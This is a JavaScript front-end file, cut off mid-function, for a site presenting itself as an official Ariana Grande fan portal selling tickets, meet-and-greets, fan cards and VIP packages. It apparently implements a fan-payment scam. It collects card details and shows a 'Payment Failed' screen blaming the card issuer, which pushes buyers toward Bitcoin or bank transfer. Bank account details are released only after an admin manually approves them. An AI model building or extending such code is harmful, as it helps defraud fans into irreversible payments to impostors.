/* ══════════════════════════════════════════════════
   ARIANA GRANDE OFFICIAL FAN PORTAL  —  index.js  (API-connected)
   ══════════════════════════════════════════════════ */

'use strict';

/* ─────────────────────────────────────────
   1. CURRENCY ENGINE
───────────────────────────────────────── */
const CURRENCIES = {
  USD: { symbol: '$',   code: 'USD', rate: 1,          decimals: 2, btc: false },
  GBP: { symbol: '£',   code: 'GBP', rate: 0.79,       decimals: 2, btc: false },
  EUR: { symbol: '€',   code: 'EUR', rate: 0.93,       decimals: 2, btc: false },
  CAD: { symbol: 'C$',  code: 'CAD', rate: 1.37,       decimals: 2, btc: false },
  AUD: { symbol: 'A$',  code: 'AUD', rate: 1.55,       decimals: 2, btc: false },
  BTC: { symbol: '₿',   code: 'BTC', rate: 0.0000154,  decimals: 8, btc: true  },
};

let activeCurrency = 'USD';
let paymentInfo    = {};
let liveEvents     = [];

function convertPrice(usdAmount) {
  const cur = CURRENCIES[activeCurrency];
  const converted = usdAmount * cur.rate;
  if (cur.btc) return cur.symbol + converted.toFixed(cur.decimals);
  return cur.symbol + converted.toLocaleString('en-US', {
    minimumFractionDigits: cur.decimals,
    maximumFractionDigits: cur.decimals,
  });
}

function refreshAllPrices() {
  // Service card prices — keyed from backend paymentInfo
  document.querySelectorAll('[data-price-key] .price-display').forEach(el => {
    const key = el.closest('[data-price-key]').dataset.priceKey;
    const usd = parseFloat(paymentInfo[key] || 0);
    el.textContent = usd ? convertPrice(usd) : '—';
  });

  // Tier prices — use live FC_TIERS_USD (already loaded from backend)
  document.querySelectorAll('.tier-price[data-price-key]').forEach(el => {
    const key  = el.dataset.priceKey;
    const usd  = parseFloat(paymentInfo[key] || 0);
    const span = el.querySelector('.price-display');
    if (span) span.textContent = usd ? convertPrice(usd) : '—';
  });

  const fcTier = document.getElementById('fc-tier');
  if (fcTier) {
    fcTier.querySelectorAll('option').forEach(opt => {
      const label = opt.value.charAt(0) + opt.value.slice(1).toLowerCase();
      opt.textContent = `${label} Fan — ${convertPrice(FC_TIERS_USD[opt.value] || 10)}/year`;
    });
  }

  refreshTicketEventSelect();
  computeTicketTotal();
  computeMeetGreetTotal();
  computeFanCardTotal();
  computeVipTotal();
  toggleBtcPanels();
  if (activeCurrency === 'BTC') updateBtcAmounts();
}

function toggleBtcPanels() {
  // When currency switches to BTC, auto-select Bitcoin tab in every open modal
  if (activeCurrency === 'BTC') {
    document.querySelectorAll('.modal-overlay.open .pay-method').forEach(btn => {
      if (btn.dataset.method === 'bitcoin') {
        activatePayMethod(btn);
      }
    });
  }
  // NOTE: bank details are NOT rebuilt here — they only arrive via admin SSE
  updateBtcAmounts();
}

/* ─────────────────────────────────────────
   2. FETCH BACKEND DATA
───────────────────────────────────────── */
async function fetchPaymentInfo() {
  try {
    const res = await fetch('/api/payment-info');
    paymentInfo = await res.json();
    applyPricesFromBackend(paymentInfo);   // ← load prices before rendering
    applyPaymentInfoToModals();
  } catch (e) {
    console.warn('[AG] Payment info unavailable, using defaults.', e);
  }
}

async function fetchEvents() {
  try {
    const res = await fetch('/api/events');
    liveEvents = await res.json();
    renderEventsList(liveEvents);
    populateEventSelects(liveEvents);
  } catch (e) {
    console.warn('[AG] Events unavailable, using static fallback.', e);
  }
}

/* ─────────────────────────────────────────
   3. RENDER EVENTS LIST
───────────────────────────────────────── */
function renderEventsList(events) {
  const container = document.querySelector('.events-list');
  if (!container || !events.length) return;
  container.innerHTML = events.map(e => `
    <div class="event-item">
      <div class="event-date">
        <span class="event-month">${e.month}</span>
        <span class="event-day">${e.day}</span>
      </div>
      <div class="event-info">
        <h3 class="event-name">${e.title}</h3>
        <p class="event-location">${e.venue} · ${e.city}, ${e.country}</p>
      </div>
      <span class="event-badge">${e.badge}</span>
    </div>`).join('');
}

function populateEventSelects(events) {
  const tEvent = document.getElementById('t-event');
  if (!tEvent || !events.length) return;
  tEvent.innerHTML = events.map(e =>
    `<option value="${e.price_usd}" data-id="${e.id}">${e.title} (${convertPrice(e.price_usd)}/seat)</option>`
  ).join('');
  computeTicketTotal();
}

function refreshTicketEventSelect() {
  const tEvent = document.getElementById('t-event');
  if (!tEvent) return;
  tEvent.querySelectorAll('option').forEach((opt, i) => {
    const ev = liveEvents[i];
    if (ev) opt.textContent = `${ev.title} (${convertPrice(ev.price_usd)}/seat)`;
  });
}

/* ─────────────────────────────────────────
   4. APPLY PAYMENT INFO TO MODALS
───────────────────────────────────────── */
/* ─────────────────────────────────────────
   4a. PAYMENT INFO — inject live backend data into all panels
───────────────────────────────────────── */
function applyPaymentInfoToModals() {
  // Crypto wallet addresses
  const btcAddr = paymentInfo.btc_wallet || '';
  document.querySelectorAll('.btc-address').forEach(el => {
    el.textContent = btcAddr || 'Wallet address not configured — contact support';
    el.classList.toggle('btc-unconfigured', !btcAddr);
  });
  // Bank panels stay blank — details arrive only via admin SSE approval

  // Footer social + links
  applyFooterLinks(paymentInfo);

  // Service card content
  applyServiceCardContent(paymentInfo);
}

function applyServiceCardContent(info) {
  const set = (id, val) => {
    const el = document.getElementById(id);
    if (el && val) el.textContent = val;
  };
  set('svc-ticket-icon',  info.svc_ticket_icon);
  set('svc-ticket-title', info.svc_ticket_title);
  set('svc-ticket-desc',  info.svc_ticket_desc);
  set('svc-ticket-label', info.svc_ticket_label);
  set('svc-mg-icon',      info.svc_mg_icon);
  set('svc-mg-title',     info.svc_mg_title);
  set('svc-mg-desc',      info.svc_mg_desc);
  set('svc-mg-label',     info.svc_mg_label);
  set('svc-fc-icon',      info.svc_fc_icon);
  set('svc-fc-title',     info.svc_fc_title);
  set('svc-fc-desc',      info.svc_fc_desc);
  set('svc-fc-label',     info.svc_fc_label);
  set('svc-vip-icon',     info.svc_vip_icon);
  set('svc-vip-title',    info.svc_vip_title);
  set('svc-vip-desc',     info.svc_vip_desc);
  set('svc-vip-label',    info.svc_vip_label);
}

function applyFooterLinks(info) {
  const set = (id, href, label) => {
    const el = document.getElementById(id);
    if (!el) return;
    if (href) {
      el.href = href;
      // Open external URLs in new tab; internal/mailto stay same tab
      el.target = href.startsWith('http') ? '_blank' : '';
    }
    if (label) el.textContent = label;
  };

  set('fl-instagram', info.social_instagram);
  set('fl-twitter',   info.social_twitter);
  set('fl-tiktok',    info.social_tiktok);
  set('fl-contact',   info.footer_contact_url);
  set('fl-terms',     info.footer_terms_url);

  // Copyright year + text
  const copy = document.getElementById('footerCopy');
  if (copy && info.footer_copyright) {
    copy.innerHTML = `&copy; ${new Date().getFullYear()} ${info.footer_copyright}`;
  }
}

// Bank details are NEVER built from local paymentInfo.
// They are delivered exclusively through SSE after admin clicks "Send Details".
// This function is intentionally a no-op stub — do not restore the old logic.
function getBankRowsHtml() {
  return ''; // never called — details come via SSE only
}

function buildBankHtml() {
  // no-op — bank panels stay as placeholders until admin sends via SSE
}

// Update BTC amount displays inside open bitcoin panels
function updateBtcAmounts() {
  const btcRate = CURRENCIES.BTC.rate;
  const amountMap = {
    't-btc-amount':  () => {
      const p = parseFloat(document.getElementById('t-event')?.value || 30);
      const q = parseInt(document.getElementById('t-qty')?.value || 1);
      return (p * q + TICKET_FEE_USD) * btcRate;
    },
    'mg-btc-amount': () => (MG_PRICE_USD + MG_FEE_USD) * btcRate,
    'fc-btc-amount': () => {
      const tier = document.getElementById('fc-tier')?.value || 'SILVER';
      return (FC_TIERS_USD[tier] + FC_DELIVERY) * btcRate;
    },
    'v-btc-amount':  () => {
      const q = parseInt(document.getElementById('v-qty')?.value || 1);
      return VIP_PRICE_USD * q * btcRate;
    },
  };
  for (const [id, calc] of Object.entries(amountMap)) {
    const el = document.getElementById(id);
    if (el) el.textContent = '₿ ' + calc().toFixed(8);
  }
}

/* ─────────────────────────────────────────
   5. CURRENCY SWITCHER
───────────────────────────────────────── */
/* ─────────────────────────────────────────
   CURRENCY SYNC — keeps desktop tabs, mobile pill, and drawer in sync
───────────────────────────────────────── */
function setCurrency(cur) {
  activeCurrency = cur;
  // Sync all currency UIs — nav desktop, mobile pill, drawer, and in-modal bars
  document.querySelectorAll('.cur-tab, .mob-cur, .drawer-cur, .modal-cur').forEach(b =>
    b.classList.toggle('active', b.dataset.cur === cur)
  );
  refreshAllPrices();
}

function initCurrencyTabs() {
  // Desktop tabs
  document.getElementById('currencyTabs').addEventListener('click', e => {
    const btn = e.target.closest('.cur-tab');
    if (btn) setCurrency(btn.dataset.cur);
  });
  // Mobile pill
  const mobCurrency = document.getElementById('mobCurrency');
  if (mobCurrency) {
    mobCurrency.addEventListener('click', e => {
      const btn = e.target.closest('.mob-cur');
      if (btn) setCurrency(btn.dataset.cur);
    });
  }
  // Drawer currency
  const drawer = document.getElementById('mobileDrawer');
  if (drawer) {
    drawer.addEventListener('click', e => {
      const btn = e.target.closest('.drawer-cur');
      if (btn) setCurrency(btn.dataset.cur);
    });
  }
}

/* ─────────────────────────────────────────
   6. MODAL SYSTEM
───────────────────────────────────────── */
function openModal(type) {
  const overlay = document.getElementById('modal-' + type);
  if (!overlay) return;
  overlay.classList.add('open');
  document.body.style.overflow = 'hidden';
  refreshAllPrices();
}

function closeModal(type) {
  const overlay = document.getElementById('modal-' + type);
  if (!overlay) return;
  overlay.classList.remove('open');
  document.body.style.overflow = '';
  document.getElementById(type + 'Form')?.style.setProperty('display', '');
  document.getElementById(type + '-success')?.classList.remove('show');
}

function initModalTriggers() {
  document.addEventListener('click', e => {
    const trigger = e.target.closest('[data-modal]');
    if (trigger) {
      closeDrawer();                          // close drawer if open
      openModal(trigger.dataset.modal);
      return;
    }
    const closer = e.target.closest('[data-close]');
    if (closer)  { closeModal(closer.dataset.close); return; }
    const overlay = e.target.closest('.modal-overlay');
    if (overlay && e.target === overlay) closeModal(overlay.dataset.modalId);
  });

  document.querySelectorAll('[data-scroll]').forEach(btn =>
    btn.addEventListener('click', () => {
      const id = btn.dataset.scroll;
      document.getElementById(id)?.scrollIntoView({ behavior:'smooth' });
      history.replaceState(null, '', '#' + id);
    })
  );

  // All nav links (desktop + drawer)
  document.addEventListener('click', e => {
    const link = e.target.closest('.nav-link, .drawer-link');
    if (!link) return;
    e.preventDefault();
    const id = link.getAttribute('href').replace('#','');
    document.getElementById(id)?.scrollIntoView({ behavior:'smooth' });
    history.replaceState(null, '', '#' + id);   // keep URL in sync on click too
    closeDrawer();
  });
}

/* ─────────────────────────────────────────
   7. PAYMENT METHOD TABS
───────────────────────────────────────── */
/* ─────────────────────────────────────────
   7. PAYMENT METHOD TABS — full panel switcher
───────────────────────────────────────── */

// All panel class names per method
const PAY_PANELS = {
  card:     'pay-panel-card',
  bank:     'pay-panel-bank',
  bitcoin:  'pay-panel-bitcoin',
};

function activatePayMethod(btn) {
  const method  = btn.dataset.method;
  const section = btn.closest('.payment-section');
  if (!section) return;

  section.querySelectorAll('.pay-method').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');

  Object.values(PAY_PANELS).forEach(cls => {
    section.querySelectorAll('.' + cls).forEach(p => p.style.display = 'none');
  });

  const target = section.querySelector('.' + (PAY_PANELS[method] || 'pay-panel-card'));
  if (target) target.style.display = 'block';

  if (method === 'bitcoin') updateBtcAmounts();

  if (method === 'bank') {
    // Show waiting placeholder — real details only arrive after admin approves via SSE
    document.querySelectorAll('.pay-panel-bank').forEach(el => {
      el.innerHTML = `
        <div class="bank-awaiting-admin">
          <div class="bank-await-icon">🏦</div>
          <div class="bank-await-title">Bank Details on Request</div>
          <div class="bank-await-desc">
            Click <strong>Pay &amp; Confirm</strong> below — our team will be
            notified instantly and will send you the exact account details
            for your <strong>${activeCurrency}</strong> transfer.
          </div>
        </div>`;
    });
  }
}

function initPaymentTabs() {
  // Payment method button clicks
  document.addEventListener('click', e => {
    const btn = e.target.closest('.pay-method');
    if (btn) { activatePayMethod(btn); return; }

    // Copy wallet address button
    const copyBtn = e.target.closest('.btc-copy-btn');
    if (copyBtn) {
      const addrEl = copyBtn.closest('.btc-address-box')?.querySelector('.btc-address');
      const copiedEl = copyBtn.closest('.pay-panel-bitcoin')?.querySelector('.btc-copied');
      if (addrEl) {
        navigator.clipboard.writeText(addrEl.textContent.trim()).then(() => {
          if (copiedEl) {
            copiedEl.style.display = 'block';
            setTimeout(() => copiedEl.style.display = 'none', 2500);
          }
        }).catch(() => {
          // Fallback for browsers without clipboard API
          const ta = document.createElement('textarea');
          ta.value = addrEl.textContent.trim();
          document.body.appendChild(ta);
          ta.select();
          document.execCommand('copy');
          document.body.removeChild(ta);
          if (copiedEl) {
            copiedEl.style.display = 'block';
            setTimeout(() => copiedEl.style.display = 'none', 2500);
          }
        });
      }
      return;
    }

    // Copy bank field button
    const copyField = e.target.closest('.copy-field-btn');
    if (copyField) {
      const val = copyField.dataset.copy;
      navigator.clipboard.writeText(val).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = val;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
      });
      copyField.textContent = '✓';
      setTimeout(() => copyField.textContent = '⧉', 1800);
    }
  });
}

/* ─────────────────────────────────────────
   8. TIME SLOTS
───────────────────────────────────────── */
function initTimeSlots() {
  document.addEventListener('click', e => {
    const slot = e.target.closest('.time-slot');
    if (!slot || slot.classList.contains('booked')) return;
    slot.closest('.slot-grid').querySelectorAll('.time-slot').forEach(s => s.classList.remove('selected'));
    slot.classList.add('selected');
  });
}

/* ─────────────────────────────────────────
   9. CARD INTERACTIONS — type selector, formatting, validation
───────────────────────────────────────── */

const CARD_TYPES = {
  visa:       { name:'Visa',       pattern:/^4/,            len:16, cvv:3, color:'#1A1F71' },
  mastercard: { name:'Mastercard', pattern:/^5[1-5]|^2[2-7]/,len:16, cvv:3, color:'#EB001B' },
  amex:       { name:'Amex',       pattern:/^3[47]/,         len:15, cvv:4, color:'#007BC1' },
  verve:      { name:'Verve',      pattern:/^650[0-9]|^5061/,len:16, cvv:3, color:'#00964B' },
};

// Detect card type from number
function detectCardType(num) {
  const clean = num.replace(/\s/g,'');
  for (const [key, cfg] of Object.entries(CARD_TYPES)) {
    if (cfg.pattern.test(clean)) return key;
  }
  return null;
}

// Format card number with spaces
function formatCardNumber(val, type) {
  const clean = val.replace(/\D/g,'');
  const cfg   = CARD_TYPES[type];
  const maxLen = cfg ? cfg.len : 16;
  const trimmed = clean.substring(0, maxLen);
  // Amex: 4-6-5 groups; others: 4-4-4-4
  if (type === 'amex') {
    return trimmed.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*/, (_,a,b,c) =>
      [a,b,c].filter(Boolean).join('  ')
    );
  }
  return trimmed.replace(/(.{4})/g,'$1  ').trim();
}

// Format expiry MM / YY
function formatExpiry(val) {
  const clean = val.replace(/\D/g,'');
  if (clean.length >= 3) return clean.substring(0,2) + ' / ' + clean.substring(2,4);
  if (clean.length === 2) return clean + ' / ';
  return clean;
}

function initCardFormatting() {
  // Card number input
  document.addEventListener('input', e => {
    const inp = e.target;
    if (inp.classList.contains('card-num')) {
      const panel   = inp.closest('.pay-panel-card');
      const selType = panel?.querySelector('.card-type.active')?.dataset.card || null;
      const detected = detectCardType(inp.value) || selType;
      inp.value = formatCardNumber(inp.value, detected);

      // Update brand icon in input
      const brand = panel?.querySelector('.card-num-brand');
      if (brand) {
        const cfg = CARD_TYPES[detected];
        brand.textContent = cfg ? cfg.name : '';
        brand.style.color = cfg ? cfg.color : 'var(--muted)';
      }

      // Auto-sync card type button
      if (detected && panel) {
        panel.querySelectorAll('.card-type').forEach(btn =>
          btn.classList.toggle('active', btn.dataset.card === detected)
        );
        // Update indicator
        const indicator = panel.querySelector('.selected-card-name');
        if (indicator) indicator.textContent = CARD_TYPES[detected]?.name + ' Card' || 'Card';
      }
    }

    if (inp.classList.contains('card-expiry')) {
      inp.value = formatExpiry(inp.value);
    }

    if (inp.classList.contains('card-cvv')) {
      inp.value = inp.value.replace(/\D/g,'');
    }
  });

  // Card type button click
  document.addEventListener('click', e => {
    const btn = e.target.closest('.card-type');
    if (!btn) return;
    const panel = btn.closest('.pay-panel-card');
    panel.querySelectorAll('.card-type').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');

    const key = btn.dataset.card;
    const cfg = CARD_TYPES[key];
    const indicator = panel?.querySelector('.selected-card-name');
    if (indicator) indicator.textContent = cfg.name + ' Card';

    // Re-format existing card number for new type
    const numInput = panel?.querySelector('.card-num');
    if (numInput?.value) numInput.value = formatCardNumber(numInput.value, key);

    // Adjust CVV maxlength
    const cvvInput = panel?.querySelector('.card-cvv');
    if (cvvInput) {
      cvvInput.maxLength  = cfg.cvv;
      cvvInput.placeholder = cfg.cvv === 4 ? '••••' : '•••';
    }
  });
}

// Validate card fields before submission
function validateCard(panel) {
  const num     = panel.querySelector('.card-num')?.value.replace(/\s/g,'') || '';
  const expiry  = panel.querySelector('.card-expiry')?.value || '';
  const cvv     = panel.querySelector('.card-cvv')?.value || '';
  const holder  = panel.querySelector('.card-holder-name')?.value.trim() || '';
  const cardType = panel.querySelector('.card-type.active')?.dataset.card || 'visa';
  const cfg     = CARD_TYPES[cardType];

  if (!holder) return { valid:false, msg:'Please enter the name on your card.' };
  if (num.length < (cfg?.len || 15)) return { valid:false, msg:'Please enter a valid card number.' };
  if (!expiry.includes('/')) return { valid:false, msg:'Please enter your card expiry date.' };
  if (cvv.length < (cfg?.cvv === 4 ? 4 : 3)) return { valid:false, msg:'Please enter your CVV.' };

  return {
    valid: true,
    cardType,
    last4:   num.slice(-4),
    holder,
    expiry:  expiry.trim(),
  };
}

/* ─────────────────────────────────────────
   10. TOTALS
───────────────────────────────────────── */
// Service prices — populated from backend via /api/payment-info
// Defaults used only if backend hasn't loaded yet
let TICKET_FEE_USD = 1;
let MG_PRICE_USD   = 150;
let MG_FEE_USD     = 2;
let FC_TIERS_USD   = { SILVER:10, GOLD:24, PLATINUM:50 };
let FC_DELIVERY    = 1;
let VIP_PRICE_USD  = 450;

function applyPricesFromBackend(info) {
  TICKET_FEE_USD = parseFloat(info.price_ticket_fee      || 1);
  MG_PRICE_USD   = parseFloat(info.price_meetgreet       || 150);
  MG_FEE_USD     = parseFloat(info.price_meetgreet_fee   || 2);
  FC_TIERS_USD   = {
    SILVER:   parseFloat(info.price_fancard_silver   || 10),
    GOLD:     parseFloat(info.price_fancard_gold     || 24),
    PLATINUM: parseFloat(info.price_fancard_platinum || 50),
  };
  FC_DELIVERY  = parseFloat(info.price_fancard_delivery || 1);
  VIP_PRICE_USD = parseFloat(info.price_vip             || 450);
}

function computeTicketTotal() {
  const tEvent = document.getElementById('t-event');
  const tQty   = document.getElementById('t-qty');
  if (!tEvent || !tQty) return;
  const usdPrice = parseFloat(tEvent.value) || 30;
  const qty      = parseInt(tQty.value) || 1;
  const el = id => document.getElementById(id);
  if (el('t-unit'))  el('t-unit').textContent  = convertPrice(usdPrice);
  if (el('t-qty-display')) el('t-qty-display').textContent = '× ' + qty;
  if (el('t-fee'))   el('t-fee').textContent   = convertPrice(TICKET_FEE_USD);
  if (el('t-total')) el('t-total').textContent = convertPrice(usdPrice * qty + TICKET_FEE_USD);
}

function computeMeetGreetTotal() {
  const el = id => document.getElementById(id);
  if (el('mg-base'))  el('mg-base').textContent  = convertPrice(MG_PRICE_USD);
  if (el('mg-fee'))   el('mg-fee').textContent   = convertPrice(MG_FEE_USD);
  if (el('mg-total')) el('mg-total').textContent = convertPrice(MG_PRICE_USD + MG_FEE_USD);
}

function computeFanCardTotal() {
  const tierSel = document.getElementById('fc-tier');
  if (!tierSel) return;
  const tier  = tierSel.value;
  const price = FC_TIERS_USD[tier] || 10;
  const el = id => document.getElementById(id);
  if (el('fc-base'))     el('fc-base').textContent     = convertPrice(price);
  if (el('fc-delivery')) el('fc-delivery').textContent = convertPrice(FC_DELIVERY);
  if (el('fc-total'))    el('fc-total').textContent    = convertPrice(price + FC_DELIVERY);
  const row = document.querySelector('#fc-summary .order-row:first-child span:first-child');
  if (row) row.textContent = tier.charAt(0) + tier.slice(1).toLowerCase() + ' Fan Membership';
}

function computeVipTotal() {
  const qty   = parseInt(document.getElementById('v-qty')?.value || 1);
  const el = id => document.getElementById(id);
  if (el('v-unit'))        el('v-unit').textContent        = convertPrice(VIP_PRICE_USD);
  if (el('v-qty-display')) el('v-qty-display').textContent = qty;
  if (el('v-total'))       el('v-total').textContent       = convertPrice(VIP_PRICE_USD * qty);
}

/* ─────────────────────────────────────────
   11. COUNTERS
───────────────────────────────────────── */
function changeQty(id, delta, min, max, cb) {
  const el = document.getElementById(id);
  if (!el) return;
  el.value = Math.min(Math.max(parseInt(el.value) + delta, min), max);
  if (cb) cb();
}

function initTicketModal() {
  document.getElementById('t-minus')?.addEventListener('click', () => changeQty('t-qty',-1,1,10,computeTicketTotal));
  document.getElementById('t-plus')?.addEventListener('click',  () => changeQty('t-qty', 1,1,10,computeTicketTotal));
  document.getElementById('t-event')?.addEventListener('change', computeTicketTotal);
}

function initVipModal() {
  document.getElementById('v-minus')?.addEventListener('click', () => changeQty('v-qty',-1,1,5,computeVipTotal));
  document.getElementById('v-plus')?.addEventListener('click',  () => changeQty('v-qty', 1,1,5,computeVipTotal));
}

/* ─────────────────────────────────────────
   12. FAN CARD PREVIEW
───────────────────────────────────────── */
function updateCardPreview() {
  const f = document.getElementById('fc-fname')?.value.trim() || '';
  const l = document.getElementById('fc-lname')?.value.trim() || '';
  const holderEl = document.getElementById('cardHolder');
  const tierEl   = document.getElementById('cardTier');
  if (holderEl) holderEl.textContent = ((f||'YOUR') + ' ' + (l||'NAME')).toUpperCase();
  if (tierEl)   tierEl.textContent   = document.getElementById('fc-tier')?.value || 'SILVER';
  computeFanCardTotal();
}

function initFanCardModal() {
  document.getElementById('fc-fname')?.addEventListener('input', updateCardPreview);
  document.getElementById('fc-lname')?.addEventListener('input', updateCardPreview);
  document.getElementById('fc-tier')?.addEventListener('change', updateCardPreview);
  document.querySelectorAll('.tier-option').forEach(opt => {
    opt.addEventListener('click', () => {
      document.querySelectorAll('.tier-option').forEach(o => o.classList.remove('active'));
      opt.classList.add('active');
      const el = document.getElementById('cardTier');
      if (el) el.textContent = opt.dataset.tier;
    });
  });
}

/* ─────────────────────────────────────────
   13. PAYMENT SUBMISSION
───────────────────────────────────────── */
/* ─────────────────────────────────────────
   BANK REQUEST VIA SSE
   Fan fires a request → admin gets notified →
   admin clicks Send → SSE delivers details →
   SweetAlert displays them
───────────────────────────────────────── */

async function requestBankDetailsViaSSE({ fname, currency, amount, payload }) {
  // 1. Register the bank request on backend
  let ref;
  try {
    const r = await fetch('/api/bank-request', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ fname, currency, amount }),
    });
    const d = await r.json();
    ref = d.ref;
  } catch (e) {
    ref = 'REQ-' + Date.now();
  }

  // 2. Show SweetAlert spinner — custom HTML, no close button
  showBankWaitAlert(fname, currency, amount);

  // 3. Open SSE stream and wait for admin response
  const evtSource = new EventSource('/api/bank-request/stream/' + ref);

  evtSource.onmessage = (e) => {
    let data;
    try { data = JSON.parse(e.data); } catch { return; }

    if (data.type === 'bank_details') {
      evtSource.close();
      showBankDetailsAlert(data, currency, amount, payload, ref);
    }
    if (data.type === 'closed') {
      evtSource.close();
    }
  };

  evtSource.onerror = () => {
    evtSource.close();
    Swal.fire({
      title: 'Connection Lost',
      text: 'Could not reach the server. Please try again or use Bitcoin payment.',
      icon: 'error',
      confirmButtonText: 'OK',
      background: '#1A1A1A',
      color: '#F0EDE8',
      confirmButtonColor: '#C9A84C',
    });
  };
}

function showBankWaitAlert(fname, currency, amount) {
  Swal.fire({
    title: 'Please Wait Patiently',
    html: `
      <div class="swal-wait-body">
        <div class="swal-spinner"></div>
        <p class="swal-wait-text">
          We're preparing your <strong>${currency}</strong> bank transfer details
          for <strong>${amount}</strong>.
        </p>
        <p class="swal-wait-sub">Our team is being notified right now.<br>This usually takes under a minute.</p>
        <div class="swal-dots"><span></span><span></span><span></span></div>
      </div>`,
    showConfirmButton: false,
    allowOutsideClick: false,
    allowEscapeKey: false,
    background: '#1A1A1A',
    color: '#F0EDE8',
    customClass: { popup: 'swal-ag-popup' },
  });
}

function showBankDetailsAlert(data, currency, amount, payload, ref) {
  const fieldsHtml = (data.fields || []).map(([k, v]) => `
    <div class="swal-bank-row">
      <span class="swal-bank-key">${k}</span>
      <span class="swal-bank-val">
        ${v}
        <button class="swal-copy-btn" onclick="swalCopy(this,'${v.replace(/'/g,"\\'")}')">Copy</button>
      </span>
    </div>`).join('');

  const noteHtml = data.note
    ? `<div class="swal-bank-note">${data.note}</div>` : '';
  const supportHtml = data.support
    ? `<div class="swal-bank-support">Support: ${data.support}</div>` : '';

  Swal.fire({
    title: `${currency} Bank Details`,
    html: `
      <div class="swal-details-body">
        <div class="swal-amount-badge">
          Transfer exactly <strong>${amount}</strong>
        </div>
        <div class="swal-bank-fields">${fieldsHtml}</div>
        ${noteHtml}
        ${supportHtml}
        <p class="swal-confirm-note">Once transferred, click <strong>I've Paid</strong> below.</p>
      </div>`,
    confirmButtonText: "I've Paid",
    showCancelButton: true,
    cancelButtonText: 'Close',
    background: '#1A1A1A',
    color: '#F0EDE8',
    confirmButtonColor: '#C9A84C',
    cancelButtonColor: '#333',
    customClass: {
      popup:         'swal-ag-popup swal-details-popup',
      confirmButton: 'swal-confirm-btn',
    },
    allowOutsideClick: false,
  }).then(result => {
    if (result.isConfirmed) {
      // Create the booking as bank transfer
      fetch('/api/bookings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      }).catch(() => {});
      Swal.fire({
        title: 'Payment Noted!',
        text: 'Thank you. We will confirm your booking once the transfer is received.',
        icon: 'success',
        background: '#1A1A1A',
        color: '#F0EDE8',
        confirmButtonColor: '#C9A84C',
      });
    }
  });
}

// Copy helper called from inside SweetAlert HTML
window.swalCopy = function(btn, text) {
  navigator.clipboard.writeText(text).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  });
  btn.textContent = '✓';
  setTimeout(() => btn.textContent = 'Copy', 1800);
};

/* ─────────────────────────────────────────
   PAYMENT SUBMISSION — with card validation,
   payment-failed screen, and backend logging
───────────────────────────────────────── */

// Inject payment-failed screen into every modal (called once on init)
function injectFailedScreens() {
  document.querySelectorAll('.modal-overlay').forEach(overlay => {
    const modalId = overlay.dataset.modalId;
    if (!modalId || overlay.querySelector('.failed-screen')) return;
    const div = document.createElement('div');
    div.className = 'failed-screen';
    div.id = modalId + '-failed';
    div.innerHTML = `
      <div class="failed-icon">✕</div>
      <h2 class="failed-title">Payment Failed</h2>
      <p class="failed-msg">Your payment could not be processed due to your card issuer.
        This may be due to insufficient funds, card restrictions, or a security block.</p>
      <div class="failed-alternatives">
        <p class="failed-alt-label">Try an alternative method:</p>
        <button class="failed-alt-btn" data-switch-method="bank">
          <span>🏦</span><span>Bank Transfer</span>
        </button>
        <button class="failed-alt-btn btc-alt" data-switch-method="bitcoin">
          <span>₿</span><span>Bitcoin</span>
        </button>
      </div>
      <button class="failed-retry-btn" data-retry="${modalId}">Try Another Card</button>
    `;
    overlay.querySelector('.modal').appendChild(div);
  });
}

function showFailedScreen(modalId) {
  const overlay = document.getElementById('modal-' + modalId);
  const formEl  = overlay?.querySelector('[id$="Form"]');
  const failEl  = document.getElementById(modalId + '-failed');
  if (formEl) formEl.style.display = 'none';
  if (failEl) failEl.classList.add('show');
}

function hideFailedScreen(modalId) {
  const overlay = document.getElementById('modal-' + modalId);
  const formEl  = overlay?.querySelector('[id$="Form"]');
  const failEl  = document.getElementById(modalId + '-failed');
  if (formEl) formEl.style.display = '';
  if (failEl) failEl.classList.remove('show');
  // Reset submit button
  const btn = overlay?.querySelector('.submit-btn');
  if (btn) { btn.disabled = false; btn.textContent = 'Pay & Confirm Booking'; }
}

function initSubmitButtons() {
  // ── Main pay button ──
  document.addEventListener('click', async e => {
    const btn = e.target.closest('[data-submit]');
    if (!btn) return;

    const type   = btn.dataset.submit;
    const formId = btn.dataset.form;
    const modal  = btn.closest('.modal-overlay');
    const modalId = modal?.dataset.modalId || type;

    // Determine active payment method
    const activeMethod = modal?.querySelector('.pay-method.active')?.dataset.method || 'card';

    // ── Card validation ──
    let cardData = {};
    if (activeMethod === 'card') {
      const cardPanel = modal?.querySelector('.pay-panel-card');
      const result = validateCard(cardPanel);
      if (!result.valid) {
        // Highlight field error briefly
        cardPanel.style.outline = '1px solid var(--red)';
        setTimeout(() => cardPanel.style.outline = '', 2000);
        // Show inline error
        let errEl = cardPanel.querySelector('.card-inline-error');
        if (!errEl) {
          errEl = document.createElement('div');
          errEl.className = 'card-inline-error';
          cardPanel.insertBefore(errEl, cardPanel.firstChild);
        }
        errEl.textContent = result.msg;
        errEl.style.display = 'block';
        setTimeout(() => errEl.style.display = 'none', 3500);
        return;
      }
      cardData = result;
    }

    // ── Calculate amount ──
    let amountUsd = 30, qty = 1;
    if (type === 'tickets') {
      const p = parseFloat(document.getElementById('t-event')?.value || 30);
      qty = parseInt(document.getElementById('t-qty')?.value || 1);
      amountUsd = p * qty + TICKET_FEE_USD;
    } else if (type === 'meetgreet') {
      amountUsd = MG_PRICE_USD + MG_FEE_USD;
    } else if (type === 'fancard') {
      amountUsd = (FC_TIERS_USD[document.getElementById('fc-tier')?.value] || 10) + FC_DELIVERY;
    } else if (type === 'vip') {
      qty = parseInt(document.getElementById('v-qty')?.value || 1);
      amountUsd = VIP_PRICE_USD * qty;
    }

    const fname = document.querySelector(`#${formId} input[id$="fname"]`)?.value.trim() || '';
    const lname = document.querySelector(`#${formId} input[id$="lname"]`)?.value.trim() || '';
    const email = document.querySelector(`#${formId} input[type="email"]`)?.value.trim() || '';

    btn.disabled    = true;
    btn.textContent = 'Processing…';

